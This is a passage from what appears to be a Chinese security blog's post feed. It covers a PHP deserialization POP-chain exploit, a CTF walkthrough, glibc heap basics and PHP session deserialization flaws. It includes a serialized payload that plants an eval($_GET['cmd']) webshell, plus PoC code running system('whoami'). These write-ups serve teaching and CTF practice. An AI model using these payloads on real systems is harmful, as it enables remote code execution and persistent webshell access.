1O%3A6%3A%22Lyrics%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00lyrics%22%3Bs%3A3%3A%22666%22%3Bs%3A7%3A%22%00%2A%00song%22%3BO%3A6%3A%22Logger%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00logwriter%22%3BO%3A14%3A%22LogWriter_File%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22muma.php%22%3Bs%3A9%3A%22%00%2A%00format%22%3BO%3A13%3A%22LogFileFormat%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00filters%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A12%3A%22OutputFilter%22%3A2%3A%7Bs%3A15%3A%22%00%2A%00matchPattern%22%3Bs%3A2%3A%22%2F%2F%22%3Bs%3A14%3A%22%00%2A%00replacement%22%3Bs%3A28%3A%22%3C%3Fphp+%40eval%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%3B%7D%7Ds%3A7%3A%22%00%2A%00endl%22%3Bs%3A2%3A%22%5Cn%22%3B%7D%7D%7D%7D 将该poc填入参数中访问： 弹出警告和注意信息。再尝试访问下我们的后门文件，已经存在了： 0x03 一道CTF题目访问页面，看到源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?php //flag is in flag.php error_reporting(0); class oops &#123; protected $oop; function __construct() &#123; $this-&gt;oop = new a(); &#125; function __destruct() &#123; $this-&gt;oop-&gt;action(); &#125; &#125; class a &#123; function action() &#123; echo \"Hello World!\"; &#125; &#125; class b &#123; private $file; private $token; function action() &#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo \"token can't be a number!\"; return ; &#125; if ($this-&gt;token==0)&#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\\\')==FALSE) &#123; include($this-&gt;file); echo $flag; &#125; &#125;else&#123; echo \"Oops...\"; &#125; &#125; &#125; class c &#123; private $cmd; private $token; function execcmd()&#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo \"token can't be a number!\"; return ; &#125; if ($this-&gt;token==0)&#123; if (!empty($this-&gt;cmd))&#123; system($this-&gt;cmd); &#125; &#125;else&#123; echo \"Oops...\"; &#125; &#125; &#125; if (isset($_GET['a']) and isset($_GET['b'])) &#123; $a=$_GET['a']; $b=$_GET['b']; if (stripos($a,'.')) &#123; echo \"You can't input '.' !\"; return ; &#125; $data = @file_get_contents($a,'r'); if ($data==\"HelloWorld!\" and strlen($b)&gt;5 and eregi(\"666\".substr($b,0,1),\"6668\") and substr($b,0,1)!=8)&#123; if (isset($_GET['c']))&#123; echo \"get c 2333......&lt;br&gt;\"; unserialize($_GET['c']); &#125; else &#123; echo \"cccccc......\"; &#125; &#125; else &#123; echo \"Oh no......\"; &#125; &#125; else &#123; show_source(__FILE__); &#125; ?&gt; 简单看下，考察两个点，一个是3处的弱类型校验，即参数a、b以及类成员变量token，另一个是反序列化pop链的构造。 弱类型Bypass先看下参数a和b，要同时通过GET输入并绕过类型比较才能往下执行到反序列化的逻辑： 123456if (stripos($a,'.')) &#123; echo \"You can't input '.' !\"; return ; &#125; $data = @file_get_contents($a,'r'); if ($data==\"HelloWorld!\" and strlen($b)&gt;5 and eregi(\"666\".substr($b,0,1),\"6668\") and substr($b,0,1)!=8) 对于参数a，不能输入“.”，过滤了跨目录访问，并且调用file_get_contents()函数读取名为a的文件内容，且内容为”HelloWorld!”——解决办法：file_get_contents()函数支持php伪协议，这里我们可以使用php:/input，然后再POST字符串”HelloWorld!”即可绕过 对于参数b，其长度必须大于5，第一个字符紧接着拼接在”666”字符串后面要能正则匹配上”6668”字符串，且限定第一个字符不能为8——解决办法：这里限定了参数第一个字符不能为8，但是缺陷在于使用正则匹配，我们这里可以使用%00截断作为参数b的起始字符，截断掉后面的字符从而实现666和6668能够匹配成功实现绕过，剩下的字符拼够5个字节以上即可 再看下成员变量token，其在类b和类c中均存在： 123456789101112131415161718192021class b &#123; private $file; private $token; function action() &#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo \"token can't be a number!\"; return ; &#125; if ($this-&gt;token==0)&#123; ... class c &#123; private $cmd; private $token; function execcmd()&#123; if ((ord($this-&gt;token)&gt;47)&amp;(ord($this-&gt;token)&lt;58)) &#123; echo \"token can't be a number!\"; return ; &#125; if ($this-&gt;token==0)&#123; ... 可以看到，先判断token是否为数字字符，不是才会往下判断token的值是否为0，为0则进入关键代码。但是这里判断是否为0的符号是==，存在弱类型绕过，当我们输入一个字符如a时，’a’==0是成立的。 pop链构造我们回到几个类的定义中再看看，发现只有oops类存在魔法函数__construct()和__destruct()，分析该函数： 成员变量oop，在__construct()函数中初始化为a类的实例； __construct()函数，初始化成员变量oop为a类的实例； __destruct()函数，调用oop实例的action()方法； 再看看其他几个类： a类只有输出Hello World的action()方法，无漏洞点； b类有个action()方法，含有成员变量file和token，绕过token校验之后就过滤file的跨目录，然后直接输出目标文件的flag变量值； c类有个execcmd()方法，但是和opps类__destruct()函数中调用的action()方法完全不同名，就是个坑哈哈； 这么说，能利用的只有b类，且和源码注释中提示的flag在flag.php中吻合，那就直接构造payload即可： 12345678910111213141516&lt;?php class oops &#123; protected $oop; function __construct() &#123; $this-&gt;oop = new b(); &#125; &#125; class b &#123; private $file = \"flag.php\"; private $token = \"a\"; &#125; echo urlencode(serialize(new oops()));?&gt; 输出参数c的exp为： 1O%3A4%3A%22oops%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00oop%22%3BO%3A1%3A%22b%22%3A2%3A%7Bs%3A7%3A%22%00b%00file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A8%3A%22%00b%00token%22%3Bs%3A1%3A%22a%22%3B%7D%7D getflag最后结合前面a、b参数的Bypass exp，直接构造报文发包即可get flag： 0x04 参考php对象注入-pop链的构造 php反序列化pop链一则 POP链学习| cL0und","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"堆基础","date":"2019-04-27T14:49:52.000Z","path":"2019/04/27/堆基础/","text":"网上太多关于这方面的文章了，这里不再重新造轮子了，直接引用ctf wiki以及其他的一些文章的说明，自己再添点东西就好。 0x01 何为堆 在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。 堆管理器处于用户程序与内核中间，主要做以下工作 响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。 管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。 Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。 目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。 需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。 0x02 堆的基本操作这里主要说下基本的堆操作（包括堆的分配，回收，堆分配背后的系统调用）以及堆目前的多线程支持等。 malloc1malloc(size_t n) malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理 当 n=0 时，返回当前系统允许的堆的最小内存块。 当 n 为负数时，由于在大多数系统上，size_t 是无符号数（这一点非常重要），所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。 free1free(void* p) free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。 此外，该函数也同样对异常情况进行了处理 当 p 为空指针时，函数不执行任何操作。 当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 double free。 除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。 内存分配背后的系统调用 在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。 如下图所示，我们主要考虑对堆进行申请内存块的操作。 (s)brk 对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk 的大小来向操作系统申请内存。初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同 不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。 开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。 具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示 示例： 在每一次执行完操作后，都执行了 getchar() 函数，这是为了方便查看程序真正的映射。 12345678910111213141516171819202122232425262728293031/* sbrk and brk example */#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;int main()&#123; void *curr_brk, *tmp_brk = NULL; printf(\"Welcome to sbrk example:%d\\n\", getpid()); /* sbrk(0) gives current program break location */ tmp_brk = curr_brk = sbrk(0); printf(\"Program Break Location1:%p\\n\", curr_brk); getchar(); /* brk(addr) increments/decrements program break location */ brk(curr_brk+4096); curr_brk = sbrk(0); printf(\"Program break Location2:%p\\n\", curr_brk); getchar(); brk(tmp_brk); curr_brk = sbrk(0); printf(\"Program Break Location3:%p\\n\", curr_brk); getchar(); return 0;&#125; 在第一次调用brk()之前 可以看出，并没有出现堆。此时： start_brk = end_data = brk = 0x0x230d000 第一次调用brk()——增加内存 已经出现了堆段。 1brk(curr_brk+4096); 通过增加brk的大小来向OS申请内存，较之前申请了0x1000即4096字节的内存空间。此时： start_brk = end_data = 0x0230d000 brk = 0x0230e000 其中，关于堆的那一行 0x0230d000是相应堆的起始地址 rw-p表明堆具有可读可写权限，并且属于隐私数据 00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为0 00:00是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为0 0表示着Inode 号。由于这部分内容并不是从文件中映射得到的，所以为0 第二次调用brk()——减少内存 1brk(tmp_brk); 通过减少brk的大小，使堆的内存空间减至初始的大小。此时： start_brk = end_data = brk = 0x0x230d000 恢复为了之前的状态，没有heap段。 mmap malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。 示例： 123456789101112131415161718192021222324252627282930313233343536/* Private anonymous mapping example using mmap syscall */#include &lt;stdio.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;void static inline errExit(const char* msg)&#123; printf(\"%s failed. Exiting the process\\n\", msg); exit(-1);&#125;int main()&#123; int ret = -1; printf(\"Welcome to private anonymous mapping example::PID:%d\\n\", getpid()); printf(\"Before mmap\\n\"); getchar(); char* addr = NULL; addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); if (addr == MAP_FAILED) errExit(\"mmap\"); printf(\"After mmap\\n\"); getchar(); /* Unmap mapped region. */ ret = munmap(addr, (size_t)132*1024); if(ret == -1) errExit(\"munmap\"); printf(\"After munmap\\n\"); getchar(); return 0;&#125; 在执行 mmap 之前 可以从下面的输出看到，目前只有. so文件的mmap段： mmap 后 从下面的输出可以看出，我们申请的内存与已经存在的内存段结合在了一起构成了7f2a92624000到7f2a92645000的mmap段： munmap 从下面的输出，我们可以看到我们原来申请的内存段已经没有了，内存段又恢复了原来的样子了： 多线程支持 在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。 示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* Per thread arena example. */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;void* threadFunc(void* arg) &#123; printf(\"Before malloc in thread 1\\n\"); getchar(); char* addr = (char*) malloc(1000); printf(\"After malloc and before free in thread 1\\n\"); getchar(); free(addr); printf(\"After free in thread 1\\n\"); getchar();&#125;int main() &#123; pthread_t t1; void* s; int ret; char* addr; printf(\"Welcome to per thread arena example::%d\\n\",getpid()); printf(\"Before malloc in main thread\\n\"); getchar(); addr = (char*) malloc(1000); printf(\"After malloc and before free in main thread\\n\"); getchar(); free(addr); printf(\"After free in main thread\\n\"); getchar(); ret = pthread_create(&amp;t1, NULL, threadFunc, NULL); if(ret) &#123; printf(\"Thread creation error\\n\"); return -1; &#125; ret = pthread_join(t1, &amp;s); if(ret) &#123; printf(\"Thread join error\\n\"); return -1; &#125; return 0;&#125; 注意在gcc编译时加上-lpthread参数，否则会编译出错，因为pthread不是Linux下的默认的库，也就是在链接的时候，无法找到phread库中函数的入口地址，于是链接会失败。 第一次申请之前 没有heap段。 第一次申请后 heap段被建立了，并且它就紧邻着数据段，这说明malloc的背后是用brk()函数来实现的。同时需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了|0x01291000-0x012b2000|=0x21000 个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。我们称这一块连续的内存区域为arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个arena 中获取，直到空间不足。当arena空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena也可以通过减小brk来缩小自己的空间。 在主线程释放内存后 对应的arena并没有进行回收，而是交由glibc来进行管理。当后面程序再次申请内存时，在glibc中管理的内存充足的情况下，glibc就会根据堆分配的算法来给程序分配相应的内存。 在第一个线程 malloc 之前 可以看到并没有出现与线程1相关的堆，但是出现了与线程1相关的栈。 第一个线程 malloc 后 可以看出线程1的堆段被建立了，而且它所在的位置为内存映射段区域，同样大小也是132KB(7fd1a0000000-7fd1a0021000)。因此这表明该线程申请的堆时，背后对应的函数为mmap函数。同时可以看出实际真的分配给程序的内存为64M(7fd1a0000000-7fd1a4000000)，而且只有132KB的部分具有可读可写权限，这一块连续的区域成为thread arena。 注意： 当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。 在第一个线程释放内存后 可以看到，这样释放内存同样不会把内存重新给系统。 0x03 堆相关数据结构与堆相关的数据结构主要分为 宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。 微观结构，用于具体处理堆的分配与回收中的内存块。 微观结构malloc_chunk概述 在程序的执行过程中，称由malloc()申请的内存为chunk。这块内存在ptmalloc内部用malloc_chunk结构体来表示。当程序申请的 chunk 被 free 后，会被加入到相应的空闲管理列表中。 无论一个chunk的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构。虽然它们使用了同一个数据结构，但根据是否被释放，它们的表现形式会有所不同。 malloc_chunk的结构如下： 123456789101112struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize;&#125;; 首先，这里给出一些必要的解释 INTERNAL_SIZE_T，SIZE_SZ，MALLOC_ALIGN_MASK： 12345/* The corresponding word size. */#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))/* The corresponding bit mask value. */#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT - 1) 一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。 每个字段的具体的解释如下： prev_size, 如果该 chunk 的物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。 size，该 chunk 的大小，大小必须是 2 SIZE_SZ 的整数倍。如果申请的内存大小不是 2 SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示 NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。 IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。 PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下 fd 指向下一个（非物理相邻）空闲的 chunk bk 指向上一个（非物理相邻）空闲的 chunk 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理 fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。 fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 一个已经分配的 chunk 的样子如下。我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。 当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。这就是 chunk 中的空间复用。 1234567891011121314chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) .next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 被释放的 chunk 被记录在链表中（可能是循环双向链表，也可能是单向链表）。具体结构如下： 1234567891011121314151617chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`head:&apos; | Size of chunk, in bytes |A|0|P| mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . |chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+`foot:&apos; | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ 可以发现，如果一个 chunk 处于 free 状态，那么会有两个位置记录其相应的大小 本身的 size 字段会记录， 它后面的 chunk 会记录。 一般情况下，物理相邻的两个空闲 chunk 会被合并为一个 chunk 。堆管理器会通过 prev_size 字段以及 size 字段合并两个物理相邻的空闲 chunk 块。 ！！！一些关于堆的约束，后面详细考虑！！！ 12345678910111213141516171819/* The three exceptions to all this are: 1. The special chunk `top&apos; doesn&apos;t bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top&apos; is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate.*/ … 0x04 参考堆概述 堆相关数据结构","tags":[{"name":"二进制","slug":"二进制","permalink":"https://www.mi1k7ea.com/tags/二进制/"},{"name":"堆溢出","slug":"堆溢出","permalink":"https://www.mi1k7ea.com/tags/堆溢出/"}]},{"title":"PHP session反序列化漏洞","date":"2019-04-21T12:20:37.000Z","path":"2019/04/21/PHP-session反序列化漏洞/","text":"0x01 PHP session序列化机制当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp）。 session序列化及反序列化处理器PHP 内置了多种处理器用于存取 $_SESSION 数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式： 处理器 对应的存储格式 php 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 php_binary 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 php_serialize (php&gt;=5.5.4) 经过 serialize() 函数反序列处理的数组 与session存储相关的配置项配置文件php.ini中含有这几个与session存储相关的配置项： 123session.save_path =\"E:/wamp64/tmp\" --设置session的存储路径,默认在/tmpsession.auto_start = 0 --指定会话模块是否在请求开始时启动一个会话,默认为0不启动session.serialize_handler = php --定义用来序列化/反序列化的处理器名字。默认使用php PHP 提供了 session.serialize_handler 配置选项，通过该选项可以设置序列化及反序列化时使用的处理器，默认为php。如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’)，如下所示： 1234&lt;?phpini_set('session.serialize_handler', 'php_serialize');session_start();// do something 存储机制php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。 存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 下面用个简单的Demo看看存储的形式： example.php，这时是使用默认的处理器即PHP： 1234&lt;?phpsession_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 可在session.save_path对应路径下看到一个新生成的session文件，这里名为sess_cj15cikdujk6uv3bdq6qvonbe7，可以看到存储格式为：键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 添加一行代码修改处理器为php_serialize： 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 格式：经过serialize()函数反序列处理的数组 修改处理器为php_binary： 12345&lt;?phpini_set('session.serialize_handler','php_binary');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; 可以看到：键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 0x02 PHP session反序列化漏洞PHP session反序列化漏洞，简单点说，就是当网站序列化并存储Session与反序列化并读取Session的方式不同时就可能导致session反序列化漏洞的产生。 漏洞Demosave.php，和前面的demo一样，这里用的是php_serialize处理器： 12345&lt;?phpini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['m7'] = $_GET['m7'];?&gt; session_vul.php，这里用的是默认的php处理器，可以不添加该行： 123456789101112131415161718192021&lt;?php ini_set('session.serialize_handler','php');session_start();class mi1k7ea&#123; var $a; function __destruct()&#123; eval($this-&gt;a); &#125; // function __destruct()&#123; // system($this-&gt;a); // &#125; // function __sleep()&#123; // eval($this-&gt;a); // return array('a'); // &#125; // function __wakeup()&#123; // eval($this-&gt;a); // &#125;&#125;?&gt; 访问包含恶意构造序列化对象的URL： 1save.php?m7=|O:7:&quot;mi1k7ea&quot;:1:&#123;s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;&#125; 打开session文件可看到序列化存储的内容，再访问session_vul.php即可看到php代码被执行了： 这是因为php引擎会以|作为key和value的分隔符，将a:1:{s:2:”m7”;s:45:”作为SESSION的key，将O:7:”mi1k7ea”:1:{s:1:”a”;s:10:”phpinfo();”;}作为value，然后进行反序列化，就会实例化mi1k7ea对象，最后就会执行__destruct()函数中的eval()方法，相当于执行如下： 12$_SESSION['m7'] = new mi1k7ea();$_SESSION['m7']-&gt;a = 'phpinfo();'; 0x03 题目这里网上看的一道session反序列化题目，在此复现一下。 三个PHP文件如下： class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phphighlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));//show_source(__FILE__);class foo1&#123; public $varr; function __construct()&#123; $this-&gt;varr = \"i.php\"; &#125; function __destruct()&#123; if(file_exists($this-&gt;varr))&#123; echo \"&lt;br&gt;文件\".$this-&gt;varr.\"存在&lt;br&gt;\"; &#125; echo \"&lt;br&gt;这是foo1的析构函数&lt;br&gt;\"; &#125;&#125;class foo2&#123; public $varr; public $obj; function __construct()&#123; $this-&gt;varr = '1234567890'; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj-&gt;execute(); return $this-&gt;varr; &#125; function __desctuct()&#123; echo \"&lt;br&gt;这是foo2的析构函数&lt;br&gt;\"; &#125;&#125;class foo3&#123; public $varr; function execute()&#123; eval($this-&gt;varr); &#125; function __desctuct()&#123; echo \"&lt;br&gt;这是foo3的析构函数&lt;br&gt;\"; &#125;&#125;?&gt; i.php 12345678&lt;?php ini_set('session.serialize_handler', 'php'); require(\"./class.php\"); session_start(); $obj = new foo1(); $obj-&gt;varr = \"phpinfo.php\";?&gt; phpinfo.php 12345678&lt;?php session_start(); require(\"./class.php\"); $f3 = new foo3(); $f3-&gt;varr = \"phpinfo();\"; $f3-&gt;execute();?&gt; 可以看到，i.php中用的是php处理器。 在php.ini中的关键配置，注意配置中的session.serialize_handler： 123session.serialize_handler = php_serializesession.upload_progress.cleanup=Offsession.upload_progress.enabled=On 可以访问phpinfo.php查看配置信息： 默认是采用php处理器处理session，session.upload_progress.cleanup配置为Off，session.upload_progress.enabled配置为On。 说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在\\$_SESSION中获得。当PHP检测到这种POST请求时，它会在\\$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。 当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据。 也就是说，利用点是通过session.upload_progress.enabled来上传文件向session文件中写入php_serialize处理器格式的内容，从而与i.php中php处理器不同进而造成session反序列化漏洞的存在。 poc.php，用于生成序列化poc，在foo1中的构造函数中定义\\$varr的值为foo2的实例，在foo2中定义\\$obj为foo3的实例，在foo3中定义\\$varr的值为system(‘whoami’);： 1234567891011121314151617181920212223242526&lt;?phpclass foo3&#123; public $varr; function __construct()&#123; $this-&gt;varr = \"system('whoami');\"; &#125;&#125; class foo2&#123; public $varr; public $obj; function __construct()&#123; $this-&gt;varr = '1'; $this-&gt;obj = new foo3(); &#125;&#125; class foo1&#123; public $varr; function __construct()&#123; 